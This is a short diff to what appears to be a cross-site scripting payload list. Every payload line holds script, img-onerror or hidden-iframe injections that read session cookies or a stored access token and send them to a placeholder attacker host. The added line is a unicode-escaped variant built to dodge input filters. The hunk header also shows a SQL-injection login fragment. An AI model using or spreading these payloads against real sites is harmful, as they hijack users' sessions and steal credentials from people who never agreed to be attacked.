@@ -161,6 +161,8 @@ admin'  %EF%B9%A3 %EF%B9%A3%EF%B9%A3
 <script>var x;x=localStorage.getItem('access_token'); document.location.replace('http://<ATTACKER-IP>/c=2&cc='+x)</script>
 <script>document.location='http://<ATTACKER-IP>/?c=3&cc='+btoa(document.cookie)</script>
 <script>document.location='http://<ATTACKER-IP>/?c=4&cc='+btoa(localStorage.getItem('access_token'))</script>
+<script> var x;x=\u0064ocument.\u0063ookie; \u0064ocument.location.replace('http://<ATTACKER-IP>/c=12&cc='+x)</script>
+
 == other type of injection
 <img style="display: none;" src=x onerror="fetch('http://<ATTACKER-IP>/?c=6&cc='+btoa(document.cookie))">
 <iframe style="display:none" src=javascript:void(document.location="http://<ATTACKER-IP>/?c=7&cc='+document.cookie)></iframe>
